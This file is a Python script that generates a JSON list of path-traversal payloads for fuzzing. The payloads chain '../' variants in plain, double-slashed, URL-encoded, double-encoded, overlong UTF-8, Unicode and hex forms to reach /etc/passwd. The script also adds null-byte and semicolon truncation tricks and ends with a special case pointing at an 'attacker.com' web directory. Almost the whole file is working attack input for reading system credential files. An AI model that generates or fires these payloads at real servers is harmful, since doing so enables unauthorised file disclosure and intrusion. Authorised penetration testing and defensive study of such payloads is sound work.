import sys

curr_file_path = ""

#file = open("payload.txt","w")
#file.write("h")

with open("payloads.json","w") as payload_file:
	#Opening of JSON
	payload_file.write('[\n');


	#Contains the various types of directory pathing
	#%2f = / || %2e = . || %252f = / || '%255c' = \
	list_of_postfix_1 = ['/etc','/etc/', '/etc/passwd', '%2fetc%2fpasswd','/etc/passwd%00index.html', '/etc/passwd;index.html','//etc//passwd','L2V0Yy9wYXNzd2Q%3D']
	list_of_prefix = ['../','..././','./../','.../','..../','...//','....\/','..../\\']

	#Print just the postfix
	for post_style in list_of_postfix_1:
		payload_file.write('["'+post_style+'"],\n')

	#New Postfix array (Without the last '/')
	list_of_postfix = ['','etc/passwd']

	#For extended file paths (Non-encoded)
	for post_style in list_of_postfix:
		for pre_style in list_of_prefix:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Double-slashed)
	list_of_postfix_doubleslash = ['','etc//passwd']
	list_of_prefix_doubleslash = ['..//']

	for post_style in list_of_postfix_doubleslash:
		for pre_style in list_of_prefix_doubleslash:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Encoded)
	list_of_postfix_encoded = ['','etc%2fpasswd']
	list_of_prefix_encoded = ['%2e%2e%2f']

	for post_style in list_of_postfix_encoded:
		for pre_style in list_of_prefix_encoded:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Doubly-encoded)
	list_of_postfix_d_encoded = ['','etc%252fpasswd']
	list_of_prefix_d_encoded = ['%252e%252e%252f']

	for post_style in list_of_postfix_d_encoded:
		for pre_style in list_of_prefix_d_encoded:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Other UTF-8)
	list_of_postfix_utf8_encoded = ['','etc%25c0%25afpasswd']
	list_of_prefix_utf8_encoded = ['%25c0%25ae%25c0%25ae%25c0%25af']

	for post_style in list_of_postfix_utf8_encoded:
		for pre_style in list_of_prefix_utf8_encoded:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Other UTF-8) 2
	list_of_postfix_utf8_encoded2 = ['','etc%c0%afpasswd']
	list_of_prefix_utf8_encoded2 = ['%c0%ae%c0%ae%c0%af']

	for post_style in list_of_postfix_utf8_encoded2:
		for pre_style in list_of_prefix_utf8_encoded2:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Other UTF-8) 3
	list_of_postfix_utf8_encoded3 = ['','etc%u2215passwd']
	list_of_prefix_utf8_encoded3 = ['%uff0e%uff0e%u2215']

	for post_style in list_of_postfix_utf8_encoded3:
		for pre_style in list_of_prefix_utf8_encoded3:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Other UTF-8) 4
	list_of_postfix_utf8_encoded4 = ['','etc%c0%2fpasswd']
	list_of_prefix_utf8_encoded4 = ['%c0%2e%c0%2e%c0%2f']

	for post_style in list_of_postfix_utf8_encoded4:
		for pre_style in list_of_prefix_utf8_encoded4:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Other UTF-8) 5
	list_of_postfix_utf8_encoded5 = ['','etc%uEFC8passwd']
	list_of_prefix_utf8_encoded5 = ['..%uEFC8']

	for post_style in list_of_postfix_utf8_encoded5:
		for pre_style in list_of_prefix_utf8_encoded5:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#For extended file paths (Hex)
	list_of_postfix_hex = ['']
	list_of_prefix_hex = ['0x2e0x2e0x2f']

	for post_style in list_of_postfix_hex:
		for pre_style in list_of_prefix_hex:
			curr_file_path = post_style;
			for times in range(0,15):
				curr_file_path = pre_style + curr_file_path;
			#Start from longest path
			payload_file.write('["'+curr_file_path+'"],\n')
			#Reduce
	'''		for times in range(0,14):
				curr_file_path = curr_file_path[len(pre_style):]
				payload_file.write('["'+curr_file_path+'"],\n')
				if curr_file_path == "":
					break;
	'''

	#Long Prefix
	#list_of_long_prefix = ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/'
	#, 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
	#'..........................................................................',
	#'././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././',
	#'.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\']

	#for long_prefix in list_of_long_prefix:
	#	for post_style in list_of_postfix:
	#		for pre_style in list_of_prefix:
	#			curr_file_path = long_prefix
	#			for times in range(0,15):
	#				curr_file_path = curr_file_path+pre_style
				#Start from longest path
	#			payload_file.write('["'+curr_file_path+post_style+'"],\n')
				#Reduce
	#			for times in range(0,15):
	#				curr_file_path = curr_file_path[:(len(curr_file_path) - len(pre_style))]
	#				payload_file.write('["'+curr_file_path+post_style+'"],\n')

	#2-part Inputs
	list_of_second_input = ['passwd']

	#Do it with postfix_1 first
	for post_style in list_of_postfix_1:
		for second_input in list_of_second_input:
			payload_file.write('["'+post_style+'", "'+second_input+'"],\n')

	#New Postfix array (Without the last '/')
	list_of_postfix_2 = ['etc','etc/']

	for second_input in list_of_second_input:
		for post_style in list_of_postfix_2:	
			for pre_style in list_of_prefix:
				curr_file_path = post_style;
				for times in range(0,15):
					curr_file_path = pre_style + curr_file_path;
				payload_file.write('["'+curr_file_path+'", "'+second_input+'"],\n')
	'''			for times in range(0,14):
					curr_file_path = curr_file_path[len(pre_style):]
					payload_file.write('["'+curr_file_path+'", "'+second_input+'"],\n')
					if curr_file_path == "":
						break;
	'''


	#Special Cases
	payload_file.write('["../../../../../../../../var/www/attacker.com/public_html/", "image.jpg"]\n')

	#Closing
	payload_file.write(']')